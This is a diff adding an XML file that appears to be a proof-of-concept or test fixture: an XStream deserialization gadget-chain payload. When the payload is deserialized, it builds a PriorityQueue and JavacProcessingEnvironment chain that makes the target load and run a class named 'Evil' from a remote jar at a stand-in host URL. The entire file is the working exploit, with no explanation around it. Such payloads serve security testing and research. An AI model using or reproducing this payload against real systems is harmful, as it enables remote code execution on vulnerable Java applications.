@@ -1,0 +1,78 @@
+<java.util.PriorityQueue serialization='custom'>
+    <unserializable-parents/>
+    <java.util.PriorityQueue>
+        <default>
+            <size>2</size>
+            <comparator class='javafx.collections.ObservableList$1'/>
+        </default>
+        <int>3</int>
+        <com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data>
+            <dataHandler>
+                <dataSource class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'>
+                    <contentType>text/plain</contentType>
+                    <is class='java.io.SequenceInputStream'>
+                        <e class='javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator'>
+                            <iterator class='com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator'>
+                                <names class='java.util.AbstractList$Itr'>
+                                    <cursor>0</cursor>
+                                    <lastRet>-1</lastRet>
+                                    <expectedModCount>0</expectedModCount>
+                                    <outer-class class='java.util.Arrays$ArrayList'>
+                                        <a class='string-array'>
+                                            <string>Evil</string>
+                                        </a>
+                                    </outer-class>
+                                </names>
+                                <processorCL class='java.net.URLClassLoader'>
+                                    <ucp class='sun.misc.URLClassPath'>
+                                        <urls serialization='custom'>
+                                            <unserializable-parents/>
+                                            <vector>
+                                                <default>
+                                                    <capacityIncrement>0</capacityIncrement>
+                                                    <elementCount>1</elementCount>
+                                                    <elementData>
+                                                        <url>http://127.0.0.1:8000/Evil.jar</url>
+                                                    </elementData>
+                                                </default>
+                                            </vector>
+                                        </urls>
+                                        <path>
+                                            <url>http://127.0.0.1:8000/Evil.jar</url>
+                                        </path>
+                                        <loaders/>
+                                        <lmap/>
+                                    </ucp>
+                                    <package2certs class='concurrent-hash-map'/>
+                                    <classes/>
+                                    <defaultDomain>
+                                        <classloader class='java.net.URLClassLoader' reference='../..'/>
+                                        <principals/>
+                                        <hasAllPerm>false</hasAllPerm>
+                                        <staticPermissions>false</staticPermissions>
+                                        <key>
+                                            <outer-class reference='../..'/>
+                                        </key>
+                                    </defaultDomain>
+                                    <initialized>true</initialized>
+                                    <pdcache/>
+                                </processorCL>
+                            </iterator>
+                            <type>KEYS</type>
+                        </e>
+                        <in class='java.io.ByteArrayInputStream'>
+                            <buf></buf>
+                            <pos>-2147483648</pos>
+                            <mark>0</mark>
+                            <count>0</count>
+                        </in>
+                    </is>
+                    <consumed>false</consumed>
+                </dataSource>
+                <transferFlavors/>
+            </dataHandler>
+            <dataLen>0</dataLen>
+        </com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data>
+        <com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data reference='../com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'/>
+    </java.util.PriorityQueue>
+</java.util.PriorityQueue>
